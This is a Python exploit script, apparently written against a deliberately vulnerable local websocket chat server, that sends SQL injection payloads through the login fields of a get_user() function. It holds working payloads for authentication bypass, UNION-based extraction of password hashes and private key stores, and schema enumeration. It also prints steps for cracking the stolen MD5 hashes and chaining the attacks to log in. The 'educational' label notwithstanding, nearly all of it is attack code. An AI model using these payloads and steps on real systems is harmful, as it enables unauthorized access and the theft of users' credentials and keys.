#!/usr/bin/env python3
"""
SQL INJECTION EXPLOITATION SCRIPT
This demonstrates how an attacker would exploit the SQL injection vulnerability
in the get_user() function to extract sensitive data from the database.

WARNING: This is for educational purposes only!
"""

import asyncio
import websockets
import json
import time
import base64
from typing import List, Dict

class SQLInjectionExploit:
    def __init__(self, server_url: str = "ws://127.0.0.1:8765"):
        self.server_url = server_url
        
    async def test_sql_injection(self, payload: str) -> Dict:
        """
        Test a SQL injection payload by attempting to login with it.
        The vulnerable get_user() function will execute our SQL.
        """
        try:
            async with websockets.connect(self.server_url) as websocket:
                # Send USER_HELLO with our SQL injection payload as username
                hello_msg = {
                    "type": "USER_HELLO",
                    "from": payload,  # Our SQL injection goes here!
                    "to": "",
                    "ts": int(time.time() * 1000),
                    "payload": {"client": "sql-injection-test"}
                }
                await websocket.send(json.dumps(hello_msg))
                
                # Send USER_LOGIN attempt
                login_msg = {
                    "type": "USER_LOGIN",
                    "ts": int(time.time() * 1000),
                    "payload": {
                        "user_id": payload,  # SQL injection payload
                        "password": "anything"  # Password doesn't matter
                    }
                }
                await websocket.send(json.dumps(login_msg))
                
                # Collect responses
                responses = []
                try:
                    while True:
                        response = await asyncio.wait_for(websocket.recv(), timeout=2.0)
                        responses.append(json.loads(response))
                except asyncio.TimeoutError:
                    pass
                
                return {"payload": payload, "responses": responses}
                
        except Exception as e:
            return {"payload": payload, "error": str(e)}
    
    async def exploit_all_users(self) -> None:
        """
        Exploit the SQL injection to extract all user data from the database.
        """
        print("üö® SQL INJECTION EXPLOITATION DEMONSTRATION")
        print("=" * 60)
        print("Exploiting the vulnerable get_user() function...")
        print()
        
        # SQL injection payloads to test
        payloads = [
            # 1. Basic authentication bypass
            {
                "name": "Authentication Bypass",
                "payload": "admin' OR '1'='1' --",
                "description": "Bypass authentication by making the WHERE clause always true"
            },
            
            # 2. Extract all users
            {
                "name": "Extract All Users",
                "payload": "x' UNION SELECT user_id, pubkey, privkey_store, pake_password, meta, version FROM users --",
                "description": "Use UNION to extract all user data"
            },
            
            # 3. Extract specific user data
            {
                "name": "Extract Admin Data",
                "payload": "admin' UNION SELECT user_id, pubkey, privkey_store, pake_password, meta, version FROM users WHERE user_id='admin' --",
                "description": "Extract data for specific user (admin)"
            },
            
            # 4. Information gathering
            {
                "name": "Database Schema Info",
                "payload": "x' UNION SELECT sql, '', '', '', '', '' FROM sqlite_master WHERE type='table' --",
                "description": "Extract database schema information"
            },
            
            # 5. Count users
            {
                "name": "Count Users",
                "payload": "x' UNION SELECT COUNT(*), '', '', '', '', '' FROM users --",
                "description": "Count total number of users"
            }
        ]
        
        for i, test in enumerate(payloads, 1):
            print(f"üîç Test {i}: {test['name']}")
            print(f"   Description: {test['description']}")
            print(f"   Payload: {test['payload']}")
            print()
            
            result = await self.test_sql_injection(test['payload'])
            
            if "error" in result:
                print(f"   ‚ùå Error: {result['error']}")
            else:
                print(f"   üì° Responses received: {len(result['responses'])}")
                for j, response in enumerate(result['responses']):
                    print(f"   Response {j+1}: {response}")
            
            print("-" * 60)
            await asyncio.sleep(1)  # Delay between tests
    
    async def extract_password_hashes(self) -> None:
        """
        Specifically extract password hashes for later cracking.
        """
        print("\nüéØ EXTRACTING PASSWORD HASHES FOR CRACKING")
        print("=" * 60)
        
        # Payload to extract all user credentials
        payload = "x' UNION SELECT user_id, pake_password, pubkey, privkey_store, meta, version FROM users --"
        
        print(f"Payload: {payload}")
        print()
        
        result = await self.test_sql_injection(payload)
        
        if "responses" in result:
            print("üìä EXTRACTED DATA:")
            for response in result['responses']:
                if response.get('type') == 'USER_LOGGED_IN':
                    payload_data = response.get('payload', {})
                    user_id = payload_data.get('user_id', 'Unknown')
                    privkey_store = payload_data.get('privkey_store', 'None')
                    
                    print(f"‚úÖ Successfully extracted data for user: {user_id}")
                    print(f"   Private key store: {privkey_store[:50]}..." if privkey_store else "   No private key data")
                    
                elif response.get('type') == 'ERROR':
                    error_detail = response.get('payload', {}).get('detail', 'Unknown error')
                    print(f"‚ùå Error: {error_detail}")
        
        print("\nüí° NEXT STEPS:")
        print("1. Use the extracted password hashes with the MD5 cracking script")
        print("2. The MD5 hashes can be cracked very quickly")
        print("3. Use cracked passwords to login and access the system")

async def main():
    """
    Main function demonstrating SQL injection exploitation.
    """
    print("üö® SQL INJECTION EXPLOITATION DEMONSTRATION")
    print("This script exploits the SQL injection vulnerability in get_user()")
    print("Make sure the vulnerable server is running on ws://127.0.0.1:8765")
    print()
    
    attacker = SQLInjectionExploit()
    
    # Run the main exploitation
    await attacker.exploit_all_users()
    
    # Extract password hashes specifically
    await attacker.extract_password_hashes()
    
    print("\nüîó CHAINING WITH OTHER VULNERABILITIES:")
    print("1. Use timing attack to find valid usernames")
    print("2. Use SQL injection to extract password hashes")
    print("3. Use MD5 cracking to break the weak hashes")
    print("4. Login with cracked credentials")

if __name__ == "__main__":
    asyncio.run(main())
